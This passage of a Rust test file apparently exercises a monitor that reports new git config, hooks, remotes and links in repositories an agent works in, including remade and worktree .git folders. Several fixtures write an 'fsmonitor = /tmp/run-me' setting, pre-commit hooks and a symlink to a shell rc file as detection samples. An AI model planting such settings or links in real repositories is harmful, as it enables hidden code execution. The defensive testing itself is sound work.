/// look saw it gone) doesn't make this session miss what is put there
/// next.
#[test]
fn issue_874_an_empty_config_forgotten_by_another_session() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::write(git.join("config.worktree"), "").expect("empty config");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    let other = ThreadId::new();
    assert_eq!(begin(other, &repos, "Moderate"), None);
    std::fs::remove_file(git.join("config.worktree")).expect("removed");
    assert_eq!(kinds(&check(other, &repos)), Vec::<String>::new());
    std::fs::write(git.join("config.worktree"), "[core]\n").expect("config");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("config {}", git.join("config.worktree").display())]
    );
}

/// #943 (1): a `.git` that went missing at a look and is made again, a
/// different one, by a later command gets a full look (compared with an
/// empty git folder), not a first look: its config, hooks and remotes are
/// reported.
#[test]
fn issue_943_a_git_folder_made_again_later_gets_a_full_look() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::rename(&git, project.base.join("moved-git")).expect("moved away");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    for folder in ["objects", "refs/heads", "hooks", "remotes"] {
        std::fs::create_dir_all(git.join(folder)).expect("git folder");
    }
    std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
    std::fs::write(git.join("config"), "[core]\n\tfsmonitor = /tmp/run-me\n").expect("config");
    std::fs::write(git.join("hooks/pre-commit"), "#!/bin/sh\n").expect("hook");
    std::fs::write(git.join("remotes/x"), "URL: /tmp/elsewhere\n").expect("remote");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![
            format!("config {}", git.join("config").display()),
            format!("config {}", git.join("hooks").display()),
            format!("remote {}", git.join("remotes/x").display()),
        ]
    );
    let mut held = project.held();
    held.sort();
    assert_eq!(
        held,
        shown(&[git.join("config"), git.join("hooks"), git.join("remotes/x")])
    );
    // Told once.
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
}

/// #943 (1): made again empty (the Linux sandbox's mount point where `.git`
/// was missing), nothing is reported until something is put in it.
#[test]
fn issue_943_an_empty_git_folder_made_again_is_reported_once_filled() {
    let project = Project::new();
    let git = project.git();
    let (thread, repos) = baseline(&project);
    std::fs::rename(&git, project.base.join("moved-git")).expect("moved away");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    std::fs::create_dir(&git).expect("empty .git");
    std::fs::write(git.join("config"), "").expect("empty config");
    std::fs::create_dir(git.join("hooks")).expect("empty hooks");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
    fill(&git.join("config"));
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!("config {}", git.join("config").display())]
    );
}

/// #943 (1): a worktree's `.git` file made again for the same git folders
/// is compared with the last look there (its common folder's config and
/// hooks aren't new).
#[test]
fn issue_943_a_worktree_git_file_made_again_compares_with_the_last_look() {
    let project = Project::new();
    let worktree_git = project.git().join("worktrees/feature");
    std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
    std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
    std::fs::write(worktree_git.join("commondir"), "../..\n").expect("commondir");
    let worktree = project.base.join("feature");
    std::fs::create_dir_all(&worktree).expect("worktree");
    let text = format!("gitdir: {}\n", worktree_git.display());
    std::fs::write(worktree.join(".git"), &text).expect("git file");
    let thread = ThreadId::new();
    let repos = repos(&[worktree.as_path()]);
    assert_eq!(begin(thread, &repos, "Moderate"), None);
    std::fs::remove_file(worktree.join(".git")).expect("removed");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    std::fs::write(worktree.join(".git"), &text).expect("made again");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    // What is new there since the last look still is.
    std::fs::write(worktree_git.join("config.worktree"), "[core]\n").expect("config");
    assert_eq!(
        kinds(&check(thread, &repos)),
        vec![format!(
            "config {}",
            worktree_git.join("config.worktree").display()
        )]
    );
}

/// #943 review r1: a worktree removed and added again in a later command
/// (a new git folder below the common one) isn't reported for its
/// `commondir`; one naming another folder is.
#[test]
fn issue_943_a_worktree_added_again_later() {
    let project = Project::new();
    let worktree_git = project.git().join("worktrees/feature");
    let add = |commondir: &str| {
        std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
        std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
        std::fs::write(worktree_git.join("commondir"), commondir).expect("commondir");
    };
    add("../..\n");
    let worktree = project.base.join("feature");
    std::fs::create_dir_all(&worktree).expect("worktree");
    let text = format!("gitdir: {}\n", worktree_git.display());
    std::fs::write(worktree.join(".git"), &text).expect("git file");
    let thread = ThreadId::new();
    let repos = repos(&[worktree.as_path()]);
    assert_eq!(begin(thread, &repos, "Moderate"), None);
    // Moved aside, not deleted: a deleted file's or folder's inode number
    // can come back for the next one (Linux), which the look would take for
    // the same one moved back (recorded on #943).
    let removed = std::cell::Cell::new(0);
    let remove = || {
        removed.set(removed.get() + 1);
        let aside = project.base.join(format!("removed-{}", removed.get()));
        std::fs::create_dir(&aside).expect("aside");
        std::fs::rename(worktree.join(".git"), aside.join("git-file")).expect("removed");
        std::fs::rename(&worktree_git, aside.join("git-folder")).expect("removed");
        assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    };
    remove();
    add("../..\n");
    std::fs::write(worktree.join(".git"), &text).expect("added again");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    assert_eq!(project.held(), Vec::<String>::new());
    // As git writes it for a real path: quiet too.
    remove();
    add(&format!("{}\n", project.git().display()));
    std::fs::write(worktree.join(".git"), &text).expect("added again");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    // Review r2: through a link that leads to the common folder now and
    // could lead elsewhere later; another folder.
    let link = project.outside.join("common-link");
    symlink(project.git(), &link).expect("link");
    for commondir in [&link, &project.outside] {
        remove();
        add(&format!("{}\n", commondir.display()));
        std::fs::write(worktree.join(".git"), &text).expect("added again");
        let mut expected = vec![format!(
            "config {}",
            worktree_git.join("commondir").display()
        )];
        // Review r4: naming another folder, that folder is looked at as the
        // common one (its git folders found again): the link there is new.
        if commondir == &project.outside {
            expected.insert(0, format!("link {}", link.display()));
        }
        assert_eq!(kinds(&check(thread, &repos)), expected);
    }
}

/// #943 review r4: a worktree's `.git` file removed in one command and a
/// `git init` there in a later one (a `.git` folder now) gets a full look at
/// its own git folder, found again, also where the next command's look
/// (`recheck`) is the first to see it; what it reports holds there.
#[test]
fn issue_943_a_worktree_git_file_made_again_as_a_folder() {
    let project = Project::new();
    let worktree_git = project.git().join("worktrees/feature");
    std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
    std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
    std::fs::write(worktree_git.join("commondir"), "../..\n").expect("commondir");
    let worktree = project.base.join("feature");
    std::fs::create_dir_all(&worktree).expect("worktree");
    let text = format!("gitdir: {}\n", worktree_git.display());
    std::fs::write(worktree.join(".git"), &text).expect("git file");
    let thread = ThreadId::new();
    let repos = repos(&[worktree.as_path()]);
    assert_eq!(begin(thread, &repos, "Moderate"), None);
    std::fs::remove_file(worktree.join(".git")).expect("removed");
    let (message, _) = recheck(thread, "Moderate", &[worktree.as_path()]);
    assert_eq!(message, None);
    let git = worktree.join(".git");
    for folder in ["objects", "refs/heads", "hooks"] {
        std::fs::create_dir_all(git.join(folder)).expect("git folder");
    }
    std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
    std::fs::write(git.join("config"), "[core]\n\tfsmonitor = /tmp/run-me\n").expect("config");
    std::fs::write(git.join("hooks/pre-commit"), "#!/bin/sh\n").expect("hook");
    let (message, held) = recheck(thread, "Moderate", &[worktree.as_path()]);
    let message = message.expect("reported");
    let git = git.canonicalize().expect("canonical");
    assert!(
        message.contains(&git.join("config").display().to_string()),
        "{message}"
    );
    let mut held = held;
    held.sort();
    assert_eq!(held, shown(&[git.join("config"), git.join("hooks")]));
}

/// #943 review r5: the same, where a command's own look (`finish`, with its
/// git folders found again) is the first to see the remade `.git`: later
/// looks (`recheck`) walk it too, and what is new there afterwards is
/// reported.
#[test]
fn issue_943_a_remade_git_folder_seen_first_by_a_command() {
    let project = Project::new();
    let worktree_git = project.git().join("worktrees/feature");
    std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
    std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
    std::fs::write(worktree_git.join("commondir"), "../..\n").expect("commondir");
    let worktree = project.base.join("feature");
    std::fs::create_dir_all(&worktree).expect("worktree");
    let text = format!("gitdir: {}\n", worktree_git.display());
    std::fs::write(worktree.join(".git"), &text).expect("git file");
    let thread = ThreadId::new();
    let old = repos(&[worktree.as_path()]);
    assert_eq!(begin(thread, &old, "Moderate"), None);
    std::fs::remove_file(worktree.join(".git")).expect("removed");
    assert_eq!(kinds(&check(thread, &old)), Vec::<String>::new());
    let git = worktree.join(".git");
    for folder in ["objects", "refs/heads", "hooks"] {
        std::fs::create_dir_all(git.join(folder)).expect("git folder");
    }
    std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
    std::fs::write(git.join("config"), "[core]\n\tfsmonitor = /tmp/run-me\n").expect("config");
    let fresh = repos(&[worktree.as_path()]);
    let git = git.canonicalize().expect("canonical");
    assert_eq!(
        kinds(&check(thread, &fresh)),
        vec![format!("config {}", git.join("config").display())]
    );
    // The next command's look walks the new git folder, not the old ones.
    let (message, _) = recheck(thread, "Moderate", &[worktree.as_path()]);
    assert_eq!(message, None);
    std::fs::write(git.join("config.worktree"), "[core]\n").expect("config.worktree");
    assert_eq!(
        kinds(&check(thread, &fresh)),
        vec![format!("config {}", git.join("config.worktree").display())]
    );
}

/// #943 review r6: a worktree's `.git` file replaced by a `.git` folder in
/// one command (no look saw it missing) is reported as replaced, and its own
/// git folder gets a full look: its config and hooks are reported and hold
/// there, and later looks walk it.
#[test]
fn issue_943_a_worktree_git_file_replaced_by_a_folder_in_one_command() {
    let project = Project::new();
    let worktree_git = project.git().join("worktrees/feature");
    std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
    std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
    std::fs::write(worktree_git.join("commondir"), "../..\n").expect("commondir");
    let worktree = project.base.join("feature");
    std::fs::create_dir_all(&worktree).expect("worktree");
    let text = format!("gitdir: {}\n", worktree_git.display());
    std::fs::write(worktree.join(".git"), &text).expect("git file");
    let thread = ThreadId::new();
    let old = repos(&[worktree.as_path()]);
    assert_eq!(begin(thread, &old, "Moderate"), None);
    // One command: `rm .git && git init && …`.
    std::fs::remove_file(worktree.join(".git")).expect("removed");
    let git = worktree.join(".git");
    for folder in ["objects", "refs/heads", "hooks"] {
        std::fs::create_dir_all(git.join(folder)).expect("git folder");
    }
    std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
    std::fs::write(git.join("config"), "[core]\n\tfsmonitor = /tmp/run-me\n").expect("config");
    std::fs::write(git.join("hooks/pre-commit"), "#!/bin/sh\n").expect("hook");
    let git = git.canonicalize().expect("canonical");
    let found = kinds(&check(thread, &old));
    for expected in [
        format!("config {}", git.join("config").display()),
        format!("config {}", git.join("hooks").display()),
    ] {
        assert!(found.contains(&expected), "{found:?}");
    }
    assert!(
        found.iter().any(|kind| kind.starts_with("replaced")),
        "{found:?}"
    );
    let held = held_for(std::slice::from_ref(&git));
    for path in shown(&[git.join("config"), git.join("hooks")]) {
        assert!(held.contains(&path), "{held:?}");
    }
    // The next command's look walks the new git folder, and what is new
    // there afterwards is reported.
    let (message, _) = recheck(thread, "Moderate", &[worktree.as_path()]);
    assert_eq!(message, None);
    std::fs::write(git.join("config.worktree"), "[core]\n").expect("config.worktree");
    assert_eq!(
        kinds(&check(thread, &repos(&[worktree.as_path()]))),
        vec![format!("config {}", git.join("config.worktree").display())]
    );
}

/// #943 item 11 (review r1): the folder a command runs in is never left out
/// by the cap on repositories looked at, nor when what holds it is worked
/// out.
#[test]
fn issue_943_the_command_folder_is_not_left_out_by_the_cap() {
    let projects: Vec<Project> = (0..=unix::MAX_REPOS).map(|_| Project::new()).collect();
    let (last, others) = projects.split_last().expect("projects");
    let folders: Vec<&Path> = others
        .iter()
        .map(|project| project.root.as_path())
        .collect();
    assert_eq!(repos(&folders).len(), unix::MAX_REPOS);
    let found = repos_and(&folders, Some(last.root.as_path()));
    assert_eq!(found.len(), unix::MAX_REPOS + 1);
    // Its finding holds a command there, past the cap too.
    let (thread, _) = baseline(last);
    symlink(
        last.outside.join("zshrc"),
        last.git().join("COMMIT_EDITMSG"),
    )
    .expect("link");
    let mut all = folders.clone();
    all.push(last.root.as_path());
    let (_, held) = recheck(thread, "Moderate", &all);
    assert_eq!(
        held,
        vec![last.git().join("COMMIT_EDITMSG").display().to_string()]
    );
}

/// #943 item 13: after a worktree's `.git` file is replaced by a `.git`
/// folder in one command while its old git folder can't be read, that look
/// is incomplete; once the new git folder is seen in full the project is no
/// longer held as "not checked fully" (it stayed so until a restart), while
/// the main project, whose folders hold the unreadable one, still is until
/// it can be read.
#[test]
fn issue_943_a_replaced_git_seen_in_full_is_no_longer_held_as_incomplete() {
    // Root reads any folder.
    if unsafe { libc::geteuid() } == 0 {
        return;
    }
    const NOT_FULLY: &str = "(not checked fully)";
    let project = Project::new();
    let worktree_git = project.git().join("worktrees/feature");
    std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
    std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
    std::fs::write(worktree_git.join("commondir"), "../..\n").expect("commondir");
    let worktree = project.base.join("feature");
    std::fs::create_dir_all(&worktree).expect("worktree");
    let text = format!("gitdir: {}\n", worktree_git.display());
    std::fs::write(worktree.join(".git"), &text).expect("git file");
    let thread = ThreadId::new();
    let old = repos(&[worktree.as_path()]);
    assert_eq!(begin(thread, &old, "Moderate"), None);
    // One command: `rm .git && git init`, and the old git folder made
    // unreadable.
    std::fs::remove_file(worktree.join(".git")).expect("removed");
    let git = worktree.join(".git");
    for folder in ["objects", "refs/heads"] {
        std::fs::create_dir_all(git.join(folder)).expect("git folder");
    }
    std::fs::write(git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
    let git = git.canonicalize().expect("canonical");
    std::fs::set_permissions(&worktree_git, std::fs::Permissions::from_mode(0o000)).expect("chmod");
    let found = kinds(&check(thread, &old));
    let held_then = held_for(std::slice::from_ref(&git));
    // The next look walks only the new git folder, in full.
    let (_, held_now) = recheck(thread, "Moderate", &[worktree.as_path()]);
    let main_held = project.held();
    std::fs::set_permissions(&worktree_git, std::fs::Permissions::from_mode(0o755)).expect("chmod");
    assert!(
        found.contains(&format!("incomplete {}", worktree.join(".git").display())),
        "{found:?}"
    );
    assert!(
        held_then.iter().any(|held| held.ends_with(NOT_FULLY)),
        "{held_then:?}"
    );
    assert!(
        !held_now.iter().any(|held| held.ends_with(NOT_FULLY)),
        "{held_now:?}"
    );
    assert!(
        main_held.iter().any(|held| held.ends_with(NOT_FULLY)),
        "{main_held:?}"
    );
    // Readable again and seen in full by a look at the main project (the
    // replaced `.git` still holds it).
    let (main_thread, main_repos) = (ThreadId::new(), project.repos());
    assert_eq!(begin(main_thread, &main_repos, "Moderate"), None);
    let main_held = project.held();
    assert!(
        !main_held.iter().any(|held| held.ends_with(NOT_FULLY)),
        "{main_held:?}"
    );
}

/// #943 item 13 review r1: a look whose git folders overlap in other roles
/// (a `.git` file naming a folder inside the project's git folder, with a
/// `commondir` back to it) sees less of the project's git folder than a
/// look of it alone: complete, it doesn't clear the project's incomplete
/// entry.
#[test]
fn issue_943_an_overlapping_look_does_not_clear_another_incomplete_one() {
    if unsafe { libc::geteuid() } == 0 {
        return;
    }
    const NOT_FULLY: &str = "(not checked fully)";
    let project = Project::new();
    let git = project.git();
    let hidden = git.join("info/objects/y");
    std::fs::create_dir_all(&hidden).expect("hidden folder");
    std::fs::set_permissions(&hidden, std::fs::Permissions::from_mode(0o000)).expect("chmod");
    let thread = ThreadId::new();
    let found = kinds(&check(thread, &project.repos()));
    let elsewhere = project.base.join("elsewhere");
    std::fs::create_dir_all(&elsewhere).expect("elsewhere");
    std::fs::write(git.join("info/commondir"), "..\n").expect("commondir");
    std::fs::write(
        elsewhere.join(".git"),
        format!("gitdir: {}\n", git.join("info").display()),
    )
    .expect("git file");
    let overlapping = repos(&[elsewhere.as_path()]);
    let other_found = kinds(&check(ThreadId::new(), &overlapping));
    let held = project.held();
    std::fs::set_permissions(&hidden, std::fs::Permissions::from_mode(0o755)).expect("chmod");
    assert_eq!(found, vec![format!("incomplete {}", git.display())]);
    assert_eq!(
        overlapping.first().map(|repo| repo.probes().len()),
        Some(1 + 2 * 4),
        "{overlapping:?}"
    );
    assert!(
        !other_found
            .iter()
            .any(|kind| kind.starts_with("incomplete")),
        "{other_found:?}"
    );
    assert!(
        held.iter().any(|held| held.ends_with(NOT_FULLY)),
        "{held:?}"
    );
}

/// #943 item 13 review r2: a worktree's look walks its git folder from its
/// own depth; where the project's git folder alone is nested too deep below
/// it, that look doesn't clear the project's incomplete entry.
#[test]
fn issue_943_a_worktree_look_does_not_clear_a_too_deep_project() {
    const NOT_FULLY: &str = "(not checked fully)";
    let project = Project::new();
    let git = project.git();
    let worktree_git = git.join("worktrees/feature");
    std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
    std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
    std::fs::write(worktree_git.join("commondir"), "../..\n").expect("commondir");
    // 17 levels below the project's git folder, 15 below the worktree's.
    let deep = (0..13).fold(worktree_git.join("logs/refs"), |dir, _| dir.join("x"));
    std::fs::create_dir_all(&deep).expect("deep folders");
    let worktree = project.base.join("feature");
    std::fs::create_dir_all(&worktree).expect("worktree");
    std::fs::write(
        worktree.join(".git"),
        format!("gitdir: {}\n", worktree_git.display()),
    )
    .expect("git file");
    let found = kinds(&check(ThreadId::new(), &project.repos()));
    assert_eq!(found, vec![format!("incomplete {}", git.display())]);
    let worktree_found = kinds(&check(ThreadId::new(), &repos(&[worktree.as_path()])));
    assert_eq!(worktree_found, Vec::<String>::new());
    let held = project.held();
    assert!(
        held.iter().any(|held| held.ends_with(NOT_FULLY)),
        "{held:?}"
    );
}

/// #943 item 13 review r3: a repository whose `.git` names two git folders
/// (a `gitdir:` and a `commondir` an agent can write) can be incomplete for
/// too many entries while a look of each folder alone is complete: those
/// looks don't clear its entry, only a complete look of its own does.
#[test]
fn issue_943_looks_of_its_git_folders_one_by_one_do_not_clear_a_repository() {
    const NOT_FULLY: &str = "(not checked fully)";
    // Over half the cap in each.
    let fill = |git: &Path| {
        let tags = git.join("refs/tags");
        std::fs::create_dir_all(&tags).expect("tags");
        for n in 0..unix::MAX_ENTRIES / 2 + 1 {
            std::fs::write(tags.join(format!("t{n}")), "").expect("tag");
        }
    };
    let common = Project::new();
    fill(&common.git());
    let other = common.base.join("other/.git");
    for folder in ["objects", "refs/heads"] {
        std::fs::create_dir_all(other.join(folder)).expect("git folder");
    }
    std::fs::write(other.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
    std::fs::write(
        other.join("commondir"),
        format!("{}\n", common.git().display()),
    )
    .expect("commondir");
    fill(&other);
    let both = common.base.join("both");
    std::fs::create_dir_all(&both).expect("both");
    std::fs::write(both.join(".git"), format!("gitdir: {}\n", other.display())).expect("git file");
    let thread = ThreadId::new();
    let both_repos = repos(&[both.as_path()]);
    let found = kinds(&check(thread, &both_repos));
    assert_eq!(
        found,
        vec![format!("incomplete {}", both.join(".git").display())]
    );
    for folder in [common.root.clone(), common.base.join("other")] {
        assert_eq!(
            kinds(&check(thread, &repos(&[folder.as_path()]))),
            Vec::<String>::new()
        );
    }
    let held = held_for(&[common.git(), other.clone()]);
    assert!(
        held.iter().any(|held| held.ends_with(NOT_FULLY)),
        "{held:?}"
    );
    // Review r4: nor once the session forgot it (past its repository
    // limit): its entry wasn't left behind by a swap.
    let others: Vec<Project> = (0..16).map(|_| Project::new()).collect();
    for project in &others {
        assert_eq!(
            kinds(&check(thread, &project.repos())),
            Vec::<String>::new()
        );
    }
    for folder in [common.root.clone(), common.base.join("other")] {
        assert_eq!(
            kinds(&check(thread, &repos(&[folder.as_path()]))),
            Vec::<String>::new()
        );
    }
    let held = held_for(&[common.git(), other]);
    assert!(
        held.iter().any(|held| held.ends_with(NOT_FULLY)),
        "{held:?}"
    );
}

/// A linked worktree of `project` named `feature`, its git folder's
/// `commondir` holding `commondir`.
fn add_worktree(project: &Project, commondir: &str) -> (PathBuf, PathBuf, String) {
    let worktree_git = project.git().join("worktrees/feature");
    std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
    std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
    std::fs::write(worktree_git.join("commondir"), commondir).expect("commondir");
    let worktree = project.base.join("feature");
    std::fs::create_dir_all(&worktree).expect("worktree");
    let text = format!("gitdir: {}\n", worktree_git.display());
    std::fs::write(worktree.join(".git"), &text).expect("git file");
    (worktree, worktree_git, text)
}

/// #943 item 12: a worktree's `.git` file seen missing and back as the same
/// one (moved back here; on Linux a new file can also get the freed inode
/// number), whose git folder was added again with a `commondir` naming
/// another folder, gets a full look: the `commondir` is reported.
#[test]
fn issue_943_a_git_file_back_as_the_same_one_with_another_commondir() {
    let project = Project::new();
    let (worktree, worktree_git, _) = add_worktree(&project, "../..\n");
    let thread = ThreadId::new();
    let repos = repos(&[worktree.as_path()]);
    assert_eq!(begin(thread, &repos, "Moderate"), None);
    let aside = project.base.join("aside");
    std::fs::create_dir(&aside).expect("aside");
    std::fs::rename(worktree.join(".git"), aside.join("git-file")).expect("moved aside");
    std::fs::rename(&worktree_git, aside.join("git-folder")).expect("moved aside");
    assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
    std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
    std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
    std::fs::write(
        worktree_git.join("commondir"),
        format!("{}\n", project.outside.display()),
    )
    .expect("commondir");
    // Review r1: and meanwhile config in the common folder it named before.
    std::fs::write(project.git().join("config.worktree"), "[core]\n").expect("config");
    std::fs::rename(aside.join("git-file"), worktree.join(".git")).expect("moved back");
    let found = kinds(&check(thread, &repos));
    for path in [
        worktree_git.join("commondir"),
        project.git().join("config.worktree"),
    ] {
        assert!(
            found.contains(&format!("config {}", path.display())),
            "{found:?}"
        );
    }
}

/// #943 item 12: a worktree removed and added again, its `commondir`
/// through a link to the common folder (which could lead elsewhere later),
/// is reported also where the new `.git` file gets the old one's inode
/// number (Linux reuses a freed one at once), told apart by when it was
/// made.
#[test]
fn issue_943_a_worktree_added_again_on_a_reused_inode() {
    let project = Project::new();
    let (worktree, worktree_git, text) = add_worktree(&project, "../..\n");
    let link = project.outside.join("common-link");
    symlink(project.git(), &link).expect("link");
    let thread = ThreadId::new();
    let repos = repos(&[worktree.as_path()]);
    assert_eq!(begin(thread, &repos, "Moderate"), None);
    let mut reused = 0;
    for round in 0..8 {
        // Its git folder moved aside (its inode stays taken), the `.git`
        // file deleted: the freed inode is the one the next file may get.
        std::fs::rename(&worktree_git, project.base.join(format!("aside-{round}")))
            .expect("moved aside");
        let old = std::fs::symlink_metadata(worktree.join(".git"))
            .expect("git file")
            .ino();
        std::fs::remove_file(worktree.join(".git")).expect("removed");
        assert_eq!(kinds(&check(thread, &repos)), Vec::<String>::new());
        // A later command: file systems stamp creation times with a coarse
        // clock (ext4: a few milliseconds).
        std::thread::sleep(Duration::from_millis(50));
        std::fs::write(worktree.join(".git"), &text).expect("added again");
        std::fs::create_dir_all(&worktree_git).expect("worktree git folder");
        std::fs::write(worktree_git.join("HEAD"), "ref: refs/heads/feature\n").expect("HEAD");
        std::fs::write(
            worktree_git.join("commondir"),
            format!("{}\n", link.display()),
        )
        .expect("commondir");
        let new = std::fs::symlink_metadata(worktree.join(".git"))
            .expect("git file")
            .ino();
        reused += usize::from(new == old);
        let found = kinds(&check(thread, &repos));
        // Where creation times aren't recorded (or on macOS or an overlay
        // file system, where they aren't compared), a reused inode is the
        // documented limit.
        // Told apart from the code under test, so a creation time it drops
        // by mistake fails here instead of skipping.
        let git_file = worktree.join(".git");
        let compared = !cfg!(target_os = "macos")
            && std::fs::symlink_metadata(&git_file)
                .expect("git file")
                .created()
                .is_ok()
            && !on_overlay_fs(&git_file);
        if new == old && !compared {
            continue;
        }
        assert!(
            found.contains(&format!(
                "config {}",
                worktree_git.join("commondir").display()
            )),
            "round {round}, inode reused: {}: {found:?}",
            new == old
        );
    }
    // How often the case under test came up (Linux reuses freed inodes).
    #[allow(clippy::print_stderr)]
    {
        eprintln!("the .git file got its old inode number back {reused} of 8 times");
    }
}

/// #943 follow-up 19: creation times are still compared off overlay file
/// systems, on each look (the device's answer is remembered after the
/// first).
#[cfg(target_os = "linux")]
#[test]
fn issue_943_creation_times_are_compared_off_overlay() {
    let project = Project::new();
    let git = project.git();
    let meta = std::fs::symlink_metadata(&git).expect("git folder");
    let created = meta
        .created()
        .ok()
        .and_then(|time| time.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|since| since.as_nanos() as i128);
    if on_overlay_fs(&git) || created.is_none() {
        #[allow(clippy::print_stderr)]
        {
            eprintln!("skipped: no creation times to compare in the temporary folder");
        }
        return;
    }
    for _ in 0..2 {
        assert_eq!(super::unix::born(&git, &meta), created);
    }
}

/// Whether `path` is on an overlay file system, told apart from the code
/// under test.
#[cfg(target_os = "linux")]
fn on_overlay_fs(path: &Path) -> bool {
    #[allow(clippy::unnecessary_cast)]
    let overlay = fs_type_of(path) == libc::OVERLAYFS_SUPER_MAGIC as i64;
    overlay
}

#[cfg(not(target_os = "linux"))]
fn on_overlay_fs(_path: &Path) -> bool {
    false
}

#[cfg(target_os = "linux")]
fn fs_type_of(path: &Path) -> i64 {
    use std::os::unix::ffi::OsStrExt;
    let path = std::ffi::CString::new(path.as_os_str().as_bytes()).expect("path");
    let mut stat = std::mem::MaybeUninit::<libc::statfs>::uninit();
    // SAFETY: `path` is NUL-terminated and `stat` is written by the call.
    assert_eq!(unsafe { libc::statfs(path.as_ptr(), stat.as_mut_ptr()) }, 0);
    // SAFETY: `statfs` succeeded.
    #[allow(clippy::unnecessary_cast)]
    let fs_type = unsafe { stat.assume_init() }.f_type as i64;
    fs_type
}

/// Mounts made for a test, unmounted in reverse order.
#[cfg(target_os = "linux")]
struct Mounts(Vec<PathBuf>);

#[cfg(target_os = "linux")]
impl Mounts {
    fn mount(&mut self, source: &str, target: &Path, fs: &str, options: &str) {
        use std::os::unix::ffi::OsStrExt;
        let c = |text: &[u8]| std::ffi::CString::new(text).expect("no NUL");
        let (source, fs, options) = (
            c(source.as_bytes()),
            c(fs.as_bytes()),
            c(options.as_bytes()),
        );
        let target_c = c(target.as_os_str().as_bytes());
        // SAFETY: every argument is a NUL-terminated string that outlives the call.
        let status = unsafe {
            libc::mount(
                source.as_ptr(),
                target_c.as_ptr(),
                fs.as_ptr(),
                0,
                options.as_ptr().cast(),
            )
        };
        assert_eq!(
            status,
            0,
            "mount {}: {}",
            target.display(),
            std::io::Error::last_os_error()
        );
        self.0.push(target.to_path_buf());
    }
}

#[cfg(target_os = "linux")]
impl Drop for Mounts {
    fn drop(&mut self) {
        use std::os::unix::ffi::OsStrExt;
        for target in self.0.iter().rev() {
            let target = std::ffi::CString::new(target.as_os_str().as_bytes()).expect("no NUL");
            // SAFETY: `target` is NUL-terminated.
            unsafe { libc::umount2(target.as_ptr(), libc::MNT_DETACH) };
        }
    }
}

/// #943 follow-up 19: git's first write in a container copies `.git` up
/// from the image's layer, with a new creation time and the same inode
/// number. That alone isn't a replaced `.git`. Mounts an overlay, so it runs
/// only where `CORBANU_TEST_OVERLAY_MOUNTS` is set (as root in a
/// throwaway container: `docker run --privileged`).
#[cfg(target_os = "linux")]
#[test]
fn issue_943_a_git_folder_copied_up_on_overlay_isnt_replaced() {
    if std::env::var_os("CORBANU_TEST_OVERLAY_MOUNTS").is_none() {
        #[allow(clippy::print_stderr)]
        {
            eprintln!("skipped: set CORBANU_TEST_OVERLAY_MOUNTS to mount an overlay");
        }
        return;
    }
    let dir = TempDir::new().expect("temp dir");
    let base = dir.path().canonicalize().expect("canonical");
    let layers = base.join("layers");
    let merged = base.join("merged");
    std::fs::create_dir_all(&layers).expect("layers");
    std::fs::create_dir_all(&merged).expect("merged");
    let mut mounts = Mounts(Vec::new());
    // The overlay's upper layer can't be on another overlay (the container's).
    mounts.mount("tmpfs", &layers, "tmpfs", "");
    let (lower, upper, work) = (
        layers.join("lower"),
        layers.join("upper"),
        layers.join("work"),
    );
    let lower_git = lower.join("project/.git");
    for folder in ["objects/ab", "refs/heads", "hooks"] {
        std::fs::create_dir_all(lower_git.join(folder)).expect("git folder");
    }
    std::fs::write(lower_git.join("HEAD"), "ref: refs/heads/main\n").expect("HEAD");
    std::fs::write(lower_git.join("config"), "[core]\n").expect("config");
    std::fs::write(lower_git.join("refs/heads/main"), "0\n").expect("ref");
    std::fs::create_dir_all(&upper).expect("upper");
    std::fs::create_dir_all(&work).expect("work");
    // The image's layer was made earlier.
    std::thread::sleep(Duration::from_millis(20));
    mounts.mount(
        "overlay",
        &merged,
        "overlay",
        &format!(
            "lowerdir={},upperdir={},workdir={}",
            lower.display(),
            upper.display(),
            work.display()
        ),
    );
    let root = merged.join("project");
    let git = root.join(".git");
    let thread = ThreadId::new();
